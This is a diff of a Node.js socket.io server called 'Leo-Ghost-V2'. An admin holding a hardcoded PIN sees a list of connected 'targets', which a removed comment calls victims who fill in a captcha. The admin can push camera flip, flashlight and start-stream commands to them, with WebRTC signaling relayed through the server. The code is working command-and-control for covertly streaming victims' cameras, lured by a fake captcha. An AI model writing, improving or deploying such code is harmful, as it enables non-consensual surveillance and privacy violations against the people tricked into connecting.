@@ -1,7 +1,6 @@
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
-const path = require('path');
 
 const app = express();
 const server = http.createServer(app);
@@ -9,54 +8,64 @@ const io = new Server(server);
 
 app.use(express.static('public'));
 
-let adminId = null;
-let targets = {}; // Users ki list store karne ke liye
+let adminSocketId = null;
 
 io.on('connection', (socket) => {
-    console.log('New Connection:', socket.id);
+    console.log('User Connected:', socket.id);
 
-    // Jab Admin join kare
-    socket.on('admin-join', (pass) => {
-        if(pass === "0000") {
-            adminId = socket.id;
+    // Jab Admin join kare (Pin check)
+    socket.on('admin-join', (pin) => {
+        if (pin === "0000") {
+            adminSocketId = socket.id;
             socket.emit('admin-status', { success: true });
-            // Admin ko current users bhejna
-            socket.emit('update-targets', Object.keys(targets));
+            console.log("Admin Authorized:", socket.id);
+            
+            // Sabhi active targets ki list Admin ko bhejna
+            updateAdminTargetList();
         } else {
             socket.emit('admin-status', { success: false });
         }
     });
 
-    // Jab Target (Victim) captcha bhare
+    // Jab Target join kare
     socket.on('target-join', () => {
-        targets[socket.id] = { id: socket.id, status: 'online' };
-        console.log('Target Added:', socket.id);
-        if(adminId) {
-            io.to(adminId).emit('update-targets', Object.keys(targets));
-        }
-    });
-        // Signaling Logic (Specific routing)
-    socket.on('signal', (data) => {
-        // data.to pe signal bhejna
-        io.to(data.to).emit('signal', { from: socket.id, signal: data.signal });
+        socket.join('targets');
+        console.log("Target Added to Pool:", socket.id);
+        updateAdminTargetList();
     });
 
-    // Admin commands (Flashlight, Camera switch etc.)
+    // Signaling: Admin se Target ya Target se Admin
+    socket.on('signal', (data) => {
+        // data.to mein hum socket id bhejenge
+        io.to(data.to).emit('signal', {
+            from: socket.id,
+            signal: data.signal
+        });
+    });
+    // Commands: Flash, Flip, ya Start Stream
     socket.on('command', (data) => {
-        io.to(data.targetId).emit('command', data.cmd);
+        io.to(data.targetId).emit('command', {
+            cmd: data.cmd,
+            adminId: socket.id
+        });
     });
 
     socket.on('disconnect', () => {
-        if(socket.id === adminId) {
-            adminId = null;
-        } else if(targets[socket.id]) {
-            delete targets[socket.id];
-            if(adminId) {
-                io.to(adminId).emit('update-targets', Object.keys(targets));
-            }
+        if (socket.id === adminSocketId) {
+            adminSocketId = null;
         }
+        updateAdminTargetList();
     });
 });
+
+function updateAdminTargetList() {
+    if (adminSocketId) {
+        // 'targets' room mein jitne bhi log hain unki list nikalo
+        const targetSockets = io.sockets.adapter.rooms.get('targets');
+        const list = targetSockets ? Array.from(targetSockets) : [];
+        io.to(adminSocketId).emit('update-targets', list);
+    }
+}
+
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`Leo-Ghost-V2 Live on ${PORT}`));
-    
+server.listen(PORT, () => console.log(`Leo-Ghost-V2 Server running on ${PORT}`));
